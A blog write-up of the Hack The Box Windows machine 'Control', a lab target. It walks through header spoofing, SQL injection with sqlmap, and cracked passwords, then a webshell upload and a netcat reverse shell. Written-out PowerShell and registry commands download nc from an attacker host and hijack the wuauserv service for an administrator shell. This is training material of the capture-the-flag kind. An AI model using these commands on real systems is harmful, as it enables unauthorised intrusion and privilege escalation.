<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="description" content="HTB Machine Write Up - Control"><title>Hack The Box Write Up - Control | zRyuki</title><meta name="generator" content="Jekyll v4.0.0" /><meta property="og:title" content="Hack The Box Write Up - Control" /><meta name="author" content="zRyuki" /><meta property="og:locale" content="en_US" /><meta name="description" content="HTB Machine Write Up - Control" /><meta property="og:description" content="HTB Machine Write Up - Control" /><link rel="canonical" href="https://zeroryuki.github.io/posts/control/" /><meta property="og:url" content="https://zeroryuki.github.io/posts/control/" /><meta property="og:site_name" content="zRyuki" /><meta property="og:image" content="https://zeroryuki.github.io/img/Control/badge.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-04-23T21:12:17+08:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zeroryuki.github.io/img/Control/badge.png" /><meta property="twitter:title" content="Hack The Box Write Up - Control" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@zRyuki" /><meta name="google-site-verification" content="uR4O3tdC8ptzD19y4h81kQmgw4DIjwMC-FIW5gIrfkM" /> <script type="application/ld+json"> {"headline":"Hack The Box Write Up - Control","dateModified":"2020-04-23T21:12:17+08:00","datePublished":"2020-04-23T21:12:17+08:00","author":{"@type":"Person","name":"zRyuki"},"description":"HTB Machine Write Up - Control","mainEntityOfPage":{"@type":"WebPage","@id":"https://zeroryuki.github.io/posts/control/"},"image":"https://zeroryuki.github.io/img/Control/badge.png","@type":"BlogPosting","url":"https://zeroryuki.github.io/posts/control/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/icons.css"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/custom.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><meta content="zRyuki" property="og:site_name"><meta content="Hack The Box Write Up - Control" property="og:title"><meta content="article" property="og:type"><meta content="HTB Machine Write Up - Control" property="og:description"><meta content="https://zeroryuki.github.io/posts/control/" property="og:url"><meta content="2020-04-23T21:12:17+08:00" property="article:published_time"><meta content="https://zeroryuki.github.io/about/" property="article:author"><meta content="https://zeroryuki.github.io/img/Control/badge.png" property="og:image"><meta content="machine" property="article:section"><meta content="htb" property="article:tag"><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="https://avatars2.githubusercontent.com/u/34531838" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">zRyuki</a></div><div id="site-subtitle" class="font-italic">Systems were built to be owned</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/zeroryuki" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['zeroryuki','gmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" target="_blank"> <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box Write Up - Control</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box Write Up - Control</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Thu, Apr 23, 2020, 9:12 PM +0800"> Apr 23, 2020 <i class="unloaded">2020-04-23T21:12:17+08:00</i> </span> by <span class="author"> zRyuki </span></div></div><div class="row"><div class="col-lg-6"> <img src="/img/Control/icon.png"></div><div class="col-lg-5"><h2 data-toc-skip class="text-center">Control</h2><p></p><table class="table table-hover table-striped"><tbody><tr><td class="text-right">OS:<td> <img src="/img/Windows.png" height="15"> Windows<tr><td class="text-right">Difficulty:<td> <span class="text-danger bold"> Hard</span><tr><td class="text-right">Points:<td><span class="text-success">40</span><tr><td class="text-right">Release:<td>23 Nov 2019<tr><td class="text-right">IP:<td>10.10.10.167</table></div></div><div class="post-content"><h2 id="information-gathering">Information Gathering</h2><h3 id="nmap">Nmap</h3><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Nmap 7.80SVN scan initiated Thu Jan  9 04:14:50 2020 as: nmap <span class="nt">-vv</span> <span class="nt">--reason</span> <span class="nt">-Pn</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">--version-all</span> <span class="nt">-oN</span> /home/z3r0/CTF/HTB/Machine/Control/scans/_quick_tcp_nmap.txt <span class="nt">-oX</span> /home/z3r0/CTF/HTB/Machine/Control/scans/xml/_quick_tcp_nmap.xml 10.10.10.167
<span class="go">Nmap scan report for 10.10.10.167
Host is up, received user-set (0.18s latency).
Scanned at 2020-01-09 04:14:54 +08 for 55s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp  open  msrpc   syn-ack Microsoft Windows RPC
3306/tcp open  mysql?  syn-ack
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.37' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '10.10.14.37' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80SVN%I=9%D=1/9%Time=5E16384D%P=x86_64-unknown-linux-g
SF:nu%r(NULL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.37'\x20is\x20not\x
</span><span class="gp">SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");</span><span class="w">
</span><span class="gp">Service Info: OS: Windows;</span><span class="w"> </span>CPE: cpe:/o:microsoft:windows
<span class="go">
Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Thu Jan  9 04:15:49 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>59.22 seconds
</pre></table></code></div></div><p>port opened: <strong>80, 135, 3306</strong></p><h3 id="web">Web</h3><p>Checking in port 80 for website. here the landing page.</p><p><img src="/img/Control/2020-04-24-10-23-54.png" alt="" /></p><p>I can see probably a useful comment in the source code. What that ip for? Just keep it first</p><p><img src="/img/Control/2020-04-24-10-25-40.png" alt="" /></p><p>Back on the web page, there was a navigation tab on the top.</p><p><img src="/img/Control/2020-04-24-10-27-17.png" alt="" /></p><p>Admin &amp; Login button will go to same url. Checking on it, gave me some error about proxy.</p><p><img src="/img/Control/2020-04-24-10-28-13.png" alt="" /></p><h3 id="proxy-header">Proxy Header</h3><p>Googling about it with keyword <strong>HTTP Proxy header</strong> gave me result about <code class="highlighter-rouge">X-Forwarded-For</code> header field.</p><p>According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For</a></p><p><code class="highlighter-rouge"> The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. When traffic is intercepted between clients and servers, server access logs contain the IP address of the proxy or load balancer only. To see the original IP address of the client, the X-Forwarded-For request header is used. </code></p><p><img src="/img/Control/2020-04-24-10-31-38.png" alt="" /></p><p>Let’s try to add that field in my header and access the login page. and put the ip i found earlier in the source code as client</p><p><img src="/img/Control/2020-04-24-10-37-07.png" alt="" /></p><p>Yeah, now the proxy error is gone. Let’s see it in the browser. To access it, i need to modify the request header to add the above field. Im using Header Editor extension, and here my config.</p><p><img src="/img/Control/2020-04-24-10-46-57.png" alt="" /></p><p>Then trying to access admin.php page</p><p><img src="/img/Control/2020-04-24-10-45-01.png" alt="" /></p><h2 id="exploitation">Exploitation</h2><p>In the admin panel, trying with basic sql injection, i put <code class="highlighter-rouge">'</code> in search input field and got this result. Vuln to SQLI!!</p><p><img src="/img/Control/2020-04-24-10-49-45.png" alt="" /></p><p>Let’s load sqlmap for this</p><h3 id="sqlmap">SQLMap</h3><p><img src="/img/Control/2020-04-24-11-25-54.png" alt="" /></p><p>DB</p><p><img src="/img/Control/2020-04-24-12-25-23.png" alt="" /></p><p>Tables</p><p><img src="/img/Control/2020-04-24-12-26-26.png" alt="" /></p><p>Columns</p><p><img src="/img/Control/2020-04-24-12-27-44.png" alt="" /></p><p>I repeat again the process with Mysql database, and below is the result</p><p>Db: <strong>mysql</strong> Tables: <strong>User</strong> columns: <strong>User,Password</strong></p><p>Sqlmap successfully extracted the password hash</p><p><img src="/img/Control/2020-04-24-14-40-25.png" alt="" /></p><p>SQLmap Built-in cracker, cracks manager hash as <code class="highlighter-rouge">l3tm3!n</code></p><p><img src="/img/Control/2020-04-24-14-41-09.png" alt="" /></p><p>The rest of the password, I let john handle it and got hector password</p><p><img src="/img/Control/2020-04-24-14-43-54.png" alt="" /></p><p>I need some way to get into the machine. Again, sqlmap have features to upload file. I will use it to upload simple php webshell to execute some command. But i need full path with write permission for that. Look at my gobuster scan, just to get a valid Url.</p><p>Gobuster</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>/ADMIN.php (Status: 200) [Size: 89]
/About.php (Status: 200) [Size: 7867]
/Admin.php (Status: 200) [Size: 89]
/Images (Status: 301) [Size: 153]
/Index.php (Status: 200) [Size: 3145]
/LICENSE.txt (Status: 200) [Size: 17128]
/about.php (Status: 200) [Size: 7867]
/admin.php (Status: 200) [Size: 89]
/admin.php (Status: 200) [Size: 89]
/assets (Status: 301) [Size: 153]
/database.php (Status: 200) [Size: 0]
/images (Status: 301) [Size: 153]
/index.php (Status: 200) [Size: 3145]
/index.php (Status: 200) [Size: 3145]
/license.txt (Status: 200) [Size: 17128]
/uploads (Status: 301) [Size: 154]
</pre></table></code></div></div><p>I’m picking uploads dir and with common path for web service in windows, try to upload my file with sqlmap</p><p><img src="/img/Control/2020-04-24-12-58-59.png" alt="" /></p><p>And it tells me file successfully uploaded.</p><p><img src="/img/Control/2020-04-24-12-58-35.png" alt="" /></p><h3 id="webshell">Webshell</h3><p>Trying dir command in the browser, it returned a results. Nice!</p><p><img src="/img/Control/2020-04-24-13-00-13.png" alt="" /></p><p>Next I will just continue with curl</p><p><img src="/img/Control/2020-04-24-13-08-53.png" alt="" /></p><p>Just using simple approach, upload nc to the machine to get reverse shell</p><p><img src="/img/Control/2020-04-24-13-18-10.png" alt="" /></p><p><img src="/img/Control/2020-04-24-13-17-48.png" alt="" /></p><h3 id="reverse-shell">Reverse Shell</h3><p>With reverse shell command, I managed to get the connection.</p><p><img src="/img/Control/2020-04-24-13-19-39.png" alt="" /></p><p>As iusr was a low priv user, I need to leverage my access. First just look in Users dir, to look what user available. In this case Hector.</p><p><img src="/img/Control/2020-04-24-14-59-33.png" alt="" /></p><p>For Hector, I just cracked his pass with john earlier, maybe i can use it. To get Hector shell I can do with 2 ways:</p><ol><li>winrm</li><li>powershell</li></ol><h4 id="method-1-winrm">Method 1 (winrm)</h4><p>I need to access port 5985 to use winrm. Need to verify is the port available from the outside</p><p>netstat -ant</p><p><img src="/img/Control/2020-04-24-18-49-10.png" alt="" /></p><p>winrm port was opened, but only accessible from localhost. I got to portforward it. I just using plink.exe tool.</p><p>Upload plink.exe as pl.exe in tmp dir</p><p><img src="/img/Control/2020-04-24-15-43-30.png" alt="" /></p><p>Run it to forward local port 5985 on the machine to my machine on same port</p><p><img src="/img/Control/2020-04-24-15-46-01.png" alt="" /></p><p>Just login as me and now I’m able to route traffic from port 5985 on my local to port 5985 to the machine. Evil-winrm used that port by default. Just login as Hector with it</p><p><img src="/img/Control/2020-04-24-15-07-36.png" alt="" /></p><p>And grab the user flag.</p><p><img src="/img/Control/2020-04-24-15-08-43.png" alt="" /></p><h4 id="method-2-powershell">Method 2 (powershell)</h4><p>With powershell, I can just invoke command to run nc and get reverse shell as Hector</p><p>Using below command and encoded it</p><p><code class="highlighter-rouge"> powershell -nop -c "$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential('Fidelity\Hector', $pass);Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { powershell.exe -c 'IWR -uri http://10.10.14.73:8000/nc64.exe -o C:\Users\Hector\nc.exe'};Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd.exe '/c C:\users\hector\nc.exe 10.10.14.73 31337 -e cmd.exe'}" </code></p><p>With the command encoded, host nc using python simple server and run it using curl</p><p><img src="/img/Control/2020-04-24-18-19-27.png" alt="" /></p><p>And the user flag</p><p><img src="/img/Control/2020-04-24-18-21-58.png" alt="" /></p><h2 id="privesc">Privesc</h2><p>For the privesc part, no working script for me. Gotta manually check, and hit the powershell history file</p><p><img src="/img/Control/2020-04-24-16-42-15.png" alt="" /></p><p>Googling around for acl enumeration in powershell, I ended up with below command</p><p><code class="highlighter-rouge">get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *</code></p><p>The command returns huge list of output. I just scroll and looking for Full control access string. With lot of attempts, the wuauserv works for me.</p><p><img src="/img/Control/2020-04-24-16-46-48.png" alt="" /></p><p>To exploit wuauservice, run below command and utilize nc.exe which was downloaded to hector dir</p><p><code class="highlighter-rouge">reg add HKLM\System\CurrentControlSet\services\wuauserv /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\hector\nc.exe 10.10.14.73 31337 -e cmd.exe" /f</code></p><p>then just run sc.exe to start the service</p><p><code class="highlighter-rouge">sc.exe start wuauserv</code></p><p><img src="/img/Control/2020-04-24-16-52-53.png" alt="" /></p><p>Successfully run above command, got revshell connection and it was Administrator shell. With that shell, just grab the root flag.</p><p><img src="/img/Control/2020-04-24-16-52-16.png" alt="" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/machine/'>machine</a>, <a href='/categories/writeup/'>writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box Write Up - Control - zRyuki&url=https://zeroryuki.github.io/posts/control/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box Write Up - Control - zRyuki&u=https://zeroryuki.github.io/posts/control/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box Write Up - Control - zRyuki&url=https://zeroryuki.github.io/posts/control/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT Licensed --> <a class="post-tag" href="/tags/htb/">htb</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/zeroryuki/ © 2020 zRyuki MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/multimaster/" class="btn btn-outline-primary"><p>Hack The Box Writeup - Multimaster</p></a> <a href="/posts/magic/" class="btn btn-outline-primary"><p>Hack The Box Write Up - Magic</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT License --><div id="disqus_thread" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> /* * * CONFIGURATION VARIABLES * * */ var disqus_shortname = "zryuki-space"; var disqus_identifier = "/posts/control"; var disqus_url = "https://zeroryuki.github.io/posts/control/"; if (document.getElementById('disqus_thread')) { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); } </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Registry/"><div class="card-body"> <span class="timeago small"> Apr 5, 2020 <i class="unloaded">2020-04-05T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Registry</h3><div class="text-muted small"><p>Information Gathering Nmap We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ...</p></div></div></a></div><div class="card"> <a href="/posts/Traverxec/"><div class="card-body"> <span class="timeago small"> Apr 9, 2020 <i class="unloaded">2020-04-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Traverxec</h3><div class="text-muted small"><p>Information Gathering As usual, i start my recon with nmap. Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Nmap 7.80SVN scan initiated Thu Dec 5 21:18:15 2019 as: nm...</p></div></div></a></div><div class="card"> <a href="/posts/mango/"><div class="card-body"> <span class="timeago small"> Apr 17, 2020 <i class="unloaded">2020-04-17T21:34:29+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Mango</h3><div class="text-muted small"><p>Info Gathering Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 6...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/username">zRyuki</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT Licensed --> <a class="post-tag" href="/tags/htb/">htb</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-145714645-1', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zeroryuki.github.io{url}">{title}</a><div class="post-meta d-flex flex-column 